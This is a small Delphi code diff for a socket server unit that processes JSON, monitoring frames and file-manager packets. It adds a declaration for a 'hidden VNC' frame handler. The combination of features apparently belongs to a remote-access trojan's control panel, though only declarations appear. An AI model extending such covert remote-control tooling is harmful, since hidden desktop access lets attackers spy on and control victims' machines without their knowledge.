@@ -4,7 +4,7 @@ interface
 
 uses
   Winapi.Windows, Winapi.Winsock2,
-  System.SysUtils, System.Classes, System.JSON,
+  System.SysUtils, System.Classes, System.JSON, System.Diagnostics,
   System.Generics.Collections, System.SyncObjs,
   Vcl.ExtCtrls, Vcl.Forms,
   ncSockets, ncLines,
@@ -120,6 +120,7 @@ type
     procedure ProcessJSONMessage(aLine: TncLine; const RawStr: string);
     procedure ProcessMonitoringBinaryFrame(aLine: TncLine; const Payload: TBytes);
     procedure ProcessFileManagerBinaryPacket(aLine: TncLine; PacketType: Byte; const Payload: TBytes);
+    procedure ProcessHiddenVNCBinaryFrame(aLine: TncLine; const Payload: TBytes);
     procedure OnHeartbeat(Sender: TObject);
     procedure DisconnectLine(aLine: TncLine);
     procedure SendPing(aLine: TncLine);
